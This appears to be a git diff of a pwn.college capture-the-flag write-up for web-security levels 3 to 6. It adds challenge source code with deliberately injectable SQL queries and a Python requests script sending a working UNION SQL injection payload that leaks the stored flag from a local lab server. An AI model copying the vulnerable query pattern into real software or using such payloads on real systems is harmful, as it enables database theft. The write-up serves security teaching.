@@ -149,6 +149,7 @@ uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)
 * Analysing the file `/challenge/run`, here in `level3`there are two if conditions.
 
 
+> Source Code :
 ```py
 def level3():
     db.execute(("CREATE TABLE IF NOT EXISTS users AS "
@@ -189,8 +190,8 @@ pwn.college{Flag_here}
 ## Web-security level 4
 
 * This challenge is about exploiting the login page using sql injection.
-* Here is the source code of `level4`
 
+> Source Code :
 ```py
 def level4():                                                                                   
     db.execute(("CREATE TABLE IF NOT EXISTS users AS "
@@ -293,13 +294,95 @@ import requests as rq
 
 ## Web-security level 5
 
-* 
+* This level is about leaking the database information by using SQL injection. 
 
-```sh
+> Source Code :
+```py
+def level5():
+    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
+                'SELECT "flag" AS username, ? AS password'),
+               (flag,))
 
+    query = request.args.get("query", "%")
+    users = db.execute(f'SELECT username FROM users WHERE username LIKE "{query}"').fetchall()
+    return "".join(f'{user["username"]}\n' for user in users)
 ```
 
+
+* The query uses `LIKE`, which return the similar value to the search `item`.
+* The `LIKE` operator is uses like `regex` function.
+* Here `%` is use in `LIKE`, 
+* [Resource : LIKE Query](https://www.sqlitetutorial.net/tryit/query/sqlite-like/#1)
+
+> Example : 
+```sql
+
+    LIKE %W
+--  This will find the word, which ends with letter "W"
+
+    LIKE W%
+--  This will find the word, which starts with letter "W" 
+
+    LIKE %W%
+--  This will find the word, which Contain the letter "W" 
+```
+
+> Example : This query will find the list item. 
+```py
+import requests as rq
+    data = {
+        "query": "f%"
+        }
+    url = "http://challenge.localhost:80"
+    response = rq.post(url, params=data)
+    print(response, "\n", response.text)
+```
+> Result :
+ 
+```plain
+<Response [200]> 
+ flag
+```
+
+* In SQL we use `UNION` function to query multiple items in databases.
+* The query will looks something like this.
+
+```py
+import requests as rq
+    data = {
+        'query': '" UNION SELECT password FROM users --'
+        }
+    url = "http://challenge.localhost:80"
+    response = rq.post(url, params=data)
+    print(response, "\n", response.text)
+```
+* This will return the flag.
+
+> Response :  
+```plain
+<Response [200]> 
+ pwn.college{Flag_here}
+```
+
+
 ## Web-security level 6
+
+* Exploit a SQLi vulnerability with an unknown database structure.
+
+> Source Code : 
+```py
+def level6():
+    table_name = f"table{hash(flag) & 0xFFFFFFFFFFFFFFFF}"
+    db.execute((f"CREATE TABLE IF NOT EXISTS {table_name} AS "
+                'SELECT "flag" AS username, ? AS password'),
+               (flag,))
+
+    query = request.args.get("query", "%")
+    users = db.execute(f'SELECT username FROM {table_name} WHERE username LIKE "{query}"').fetchall()
+    return "".join(f'{user["username"]}\n' for user in users)
+```
+
+
 ```sh
 
 ```
